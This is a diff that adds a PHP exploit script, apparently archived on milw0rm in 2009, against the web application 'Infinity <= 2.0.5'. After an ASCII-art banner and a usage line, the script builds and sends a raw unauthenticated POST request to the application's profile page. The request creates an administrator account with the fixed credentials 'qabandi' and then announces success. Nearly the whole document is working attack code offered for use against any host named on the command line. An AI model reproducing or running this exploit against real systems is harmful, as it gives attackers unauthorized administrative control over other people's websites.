@@ -1,0 +1,95 @@
+          <?php
+print_r('
+                                       ||          ||   | ||
+                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
+                               (  :  /    (_)    /           (      .
+
+                                        ___________________
+                                      _/QQQQQQQQQQQQQQQQQQQ\__
+[q] Infinity <= 2.0.5 Create Admin __/QQQ/````````````````\QQQ\___
+                                 _/QQQQQ/                  \QQQQQQ\
+[q] _POST <3                    /QQQQ/``                    ```QQQQ\
+                               /QQQQ/                          \QQQQ\
+[q] Owned :)                  |QQQQ/    By  Qabandi             \QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+[/]   -[WHAT?]-                \QQQQ\                      __  /QQQQ/
+                                \QQQQ\                    /QQ\_QQQQ/
+                                 \QQQQ\                   \QQQQQQQ/
+                                  \QQQQQ\                 /QQQQQ/_
+                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                         ```````````````````     `````
+ ______________________________________________________________________________
+/                                                                              \
+|       :: Stupid vulnerability in a good script :( tsk tsk                    |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+                                    Sec-Code.com
+                                    
+
+USAGE: php whatever.php localhost /infinity/
+
+
+');
+
+ini_set("max_execution_time",0);
+
+ function QABANDI($victim,$vic_dir){
+$host = $victim;
+$p = "http://".$host.$vic_dir;
+
+
+
+
+          $data   ="name=qabandi&password=qabandi&conf_password=qabandi&email=Qabandi@was.here&nat=man&hoppy=QabandiWasHere&text=QabandiWasHere&country=1";
+          $packet ="POST ".$p."/cp/profile.php?action=donewauthor HTTP/1.0\r\n";
+          $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+          $packet.="Pragma: no-cache\r\n";
+          $packet.="Content-Length: ".strlen($data)."\r\n";
+          $packet.="Connection: Close\r\n\r\n";
+          $packet.=$data;
+
+
+
+         //print $packet;
+	$o = @fsockopen($host, 80);
+	if(!$o){
+		echo "\n[x] No response...\n";
+		die;
+	}
+	
+	fputs($o, $packet);
+	while (!feof($o)) $data .= fread($o, 1024);
+	fclose($o);
+	
+	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
+	if ( !empty($_404) ){
+		echo "\n[x] 404 Not Found... Make sure of path. \n";
+		die;
+	}
+	
+		$_401 = strstr( $data, "401 Authorization Required" );
+	if ( !empty($_401) ){
+		echo "\n[x] HTTP authentication detected! (mrakib jdar narry, maku faydeh) \n";
+		die;
+	}
+                                          
+                                           echo "Admin created !\n\nUsername: qabandi\npassword: qabandi";
+
+ }
+
+$host1 = $argv[1];
+$userdir1=$argv[2];
+QABANDI($host1,$userdir1);
+
+die;
+
+
+?>
+
+# milw0rm.com [2009-07-15]
